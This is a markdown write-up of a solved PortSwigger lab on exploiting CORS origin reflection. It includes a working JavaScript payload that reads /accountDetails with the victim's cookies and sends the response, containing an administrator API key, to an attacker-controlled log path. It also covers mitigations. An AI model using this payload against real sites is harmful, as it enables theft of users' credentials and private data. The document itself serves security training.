# 📘 PortSwigger Lab: CORS vulnerability with basic origin reflection

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-basic-origin-reflection-attack
> 🎯 Topic: Cross-Origin Resource Sharing (CORS) — Basic origin reflection
> 🧪 Difficulty: Apprentice
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 The Vulnerable Headers](#headers)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Locate the Target Endpoint](#step1)
- [🔍 Step 2 — Test Origin Reflection](#step2)
- [🔍 Step 3 — Construct the Exploit](#step3)
- [🔍 Step 4 — Deliver Exploit to Victim](#step4)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Exploit a misconfigured CORS policy to:

```text
1. Bypass the Same-Origin Policy (SOP).
2. Execute cross-origin JavaScript to access a restricted endpoint (`/accountDetails`).
3. Steal the authenticated victim's sensitive information (API key).
4. Exfiltrate the data back to the attacker's server.
```

<a id="theory"></a>

## 🧠 Short Theory
The Same-Origin Policy (SOP) is a fundamental browser security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. 

Cross-Origin Resource Sharing (CORS) is a mechanism that relaxes the SOP. It allows servers to explicitly declare which external domains are permitted to read their responses. If a server is misconfigured and trusts any arbitrary domain, attackers can host a malicious website that forces the victim's browser to make a cross-origin request and read the sensitive response.

<a id="idea"></a>

## 🧩 Core Idea
The target application dynamically reflects whatever value is supplied in the `Origin` HTTP header into the `Access-Control-Allow-Origin` (ACAO) response header. Crucially, it also sets `Access-Control-Allow-Credentials: true`. 

```text
Attacker site:      Executes AJAX request to target API.
Victim's browser:   Automatically attaches session cookies to the request.
Target server:      Reflects the attacker's origin and processes the request.
Victim's browser:   Reads the response (because CORS headers permit it).
Attacker site:      Exfiltrates the read response (API key) to the exploit server ✅
```

<a id="headers"></a>

## 📡 The Vulnerable Headers
When an attacker sends a request with a spoofed origin:
`Origin: https://evil.com`

The vulnerable server responds with:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
This specific combination tells the victim's browser: *"It is safe to let `https://evil.com` read this response, and yes, you should include the user's session cookies."*

<a id="exploit"></a>

## ⚡ The Exploit Payload
The attacker uses a simple `XMLHttpRequest` (or `fetch`) to perform the cross-origin request. The critical property is `req.withCredentials = true`, which instructs the browser to include the victim's session cookies, ensuring the request is authenticated.

<a id="step1"></a>

## 🔍 Step 1 — Locate the Target Endpoint
Log in to the application and navigate to the user account page.
Use Burp Suite HTTP history to find the background request that retrieves the user data.
Identify the endpoint: `GET /accountDetails`.

<a id="step2"></a>

## 🔍 Step 2 — Test Origin Reflection
Send the `/accountDetails` request to Burp Repeater.
Add a fake origin header: `Origin: https://example.com`.
Analyze the response. If the server reflects `https://example.com` in the `Access-Control-Allow-Origin` header and includes `Access-Control-Allow-Credentials: true`, the endpoint is vulnerable to CORS exploitation.

<a id="step3"></a>

## 🔍 Step 3 — Construct the Exploit
Open the Exploit Server.
Write an HTML/JS payload that sends a GET request to `/accountDetails`.
Ensure `withCredentials` is enabled.
In the `onload` callback (when the response is received), redirect the browser to the Exploit Server's log path, appending the response text as a query parameter.

<a id="step4"></a>

## 🔍 Step 4 — Deliver Exploit to Victim
Click **Store** to save the payload.
Click **Deliver exploit to victim**.
The victim's browser executes the script, retrieves their own API key, and sends it to the attacker's logs.
Check the Access Log to extract the administrator's API key.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

<a id="response"></a>

## 📥 Example Result
Extracted Log Entry (Access Log)
```text
10.0.0.1 - - [Date] "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22apikey%22:%20%22qQjvdi2VeBQ5GTc37XTTxnijg7qVrVTW%22} HTTP/1.1" 200
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify sensitive data retrieval endpoint (`/accountDetails`).
2. Verify dynamic origin reflection in CORS headers.
3. Verify support for credentials (`Access-Control-Allow-Credentials: true`).
4. Write a JS XMLHttpRequest payload to fetch the data.
5. Extract the response and append it to the attacker's logging URL.
6. Deliver payload to victim.
7. Retrieve the stolen API key from the server logs.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Blind Origin Trust
The server did not validate the `Origin` header against a strict whitelist. It blindly reflected whatever string the client provided.

2. Allowed Credentials
By explicitly allowing credentials, the server bypassed the inherent protections of cross-origin requests, allowing the attacker's script to act on behalf of the authenticated victim.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When testing APIs and data endpoints:

```text
Does the server dynamically reflect arbitrary Origin headers?
If so, does it also allow credentials? (Without credentials, CORS reflection is often useless for stealing session-specific data).
Is the retrieved data actually sensitive (PII, tokens, API keys)?
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Targeting the wrong endpoint
Sending the XMLHttpRequest to `/my-account` (the HTML page) instead of `/accountDetails` (the JSON API). The browser will attempt to stuff the entire HTML source code into the URL query string, often causing the request to fail due to URI length limits.

Mistake 2. Forgetting `withCredentials`
If `req.withCredentials = true;` is omitted, the browser sends an anonymous request. The server will likely respond with a 401 Unauthorized, and the script will exfiltrate an error message instead of the API key.

<a id="defense"></a>

## 🛡 Mitigation
1. Strict Whitelisting
Configure the server to use a strict whitelist of trusted domains. Never dynamically reflect arbitrary `Origin` headers.

2. Avoid Wildcards with Credentials
Never use the wildcard `*` for `Access-Control-Allow-Origin` if `Access-Control-Allow-Credentials` is set to `true` (browsers actually block this combination, which is why lazy developers use dynamic reflection to bypass the browser restriction).

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Identified the `/accountDetails` endpoint
- [ ] Tested `Origin` reflection in Repeater
Payload Generation
- [ ] Created XMLHttpRequest payload
- [ ] Set `req.withCredentials = true`
- [ ] Added data exfiltration logic (`location='/log?key='...`)
Execution & Verification
- [ ] Delivered exploit to victim
- [ ] Extracted API key from Access Log
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated the dangers of misconfigured CORS policies:

```text
1. Proved that dynamic origin reflection effectively destroys Same-Origin Policy protections.
2. Successfully automated a cross-origin data theft using JavaScript.
```

Main lessons:
```text
- CORS is a relaxation of security; it must be implemented with strict whitelists.
- Reflecting the Origin header is functionally equivalent to allowing any domain to read the data.
- API endpoints returning sensitive JSON are prime targets for CORS exploitation.
```
[⬆ Back to top](#top)
